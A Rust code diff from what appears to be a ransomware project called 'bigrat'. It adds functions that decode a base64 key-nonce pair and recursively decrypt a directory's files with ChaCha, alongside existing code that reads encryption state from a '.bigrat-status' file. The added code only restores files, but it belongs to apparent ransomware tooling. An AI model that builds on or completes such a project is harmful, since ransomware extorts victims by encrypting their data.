@@ -2,6 +2,9 @@ use std::fs::File;
 use std::io;
 use std::io::{Read, Seek, SeekFrom};
 use std::path::Path;
+use anyhow::{Context, Result};
+use base64::Engine;
+use decryptor::decrypt_file_chacha;
 use crate::BIGRAT_PNG;
 
 #[derive(Debug)]
@@ -32,7 +35,7 @@ impl From<io::Error> for StatusReadError {
 
 /// Get encrypted key, encrypted nonce and status of the encryption process
 /// (started or finished) from a `$working_path/.bigrat-status` file
-pub fn get_status_data(working_path: &Path) -> Result<StatusData, StatusReadError> {
+pub fn get_status_data(working_path: &Path) -> core::result::Result<StatusData, StatusReadError> {
     let status_file_path = working_path.join(".bigrat-status");
     if !status_file_path.exists() {
         return Err(StatusReadError::DoesNotExist);
@@ -67,4 +70,40 @@ pub fn get_status_data(working_path: &Path) -> Result<StatusData, StatusReadErro
         encrypted_key,
         encrypted_nonce,
     })
+}
+
+pub fn decode_pair_base64(pair_base64: &str) -> Result<([u8; 32], [u8; 19])> {
+    let mut pair = [0u8; 32+19];
+    // Ignoring trailing bits, because of the nature of base64
+    // https://github.com/marshallpierce/rust-base64#i-want-canonical-base64-encodingdecoding
+    base64::engine::general_purpose::STANDARD_NO_PAD.decode_slice_unchecked(pair_base64, &mut pair)
+        .with_context(|| "Error decoding base64 of encrypted key-nonce pair")?;
+
+    Ok((
+        <[u8; 32]>::try_from(&pair[..32])?,
+        <[u8; 19]>::try_from(&pair[32..])?,
+    ))
+}
+
+pub fn decrypt_recursive(path: &Path, key: &[u8; 32], nonce: &[u8; 19]) -> Result<()> {
+    for entry in path.read_dir()? {
+        let entry = entry?;
+        if entry.file_type()?.is_dir() {
+            decrypt_recursive(&entry.path(), &key, &nonce)?;  // TODO: handle errors
+            continue;
+        }
+
+        let encrypted_file = File::open(entry.path())?;
+        if let Err(error) = decrypt_file_chacha(
+            &encrypted_file,
+            entry.path().with_extension(""),
+            *key,
+            *nonce
+        ) {
+            eprintln!("Failed to decrypt file {:?}: {}", entry.path(), error);
+            continue;
+        }
+    }
+
+    Ok(())
 }
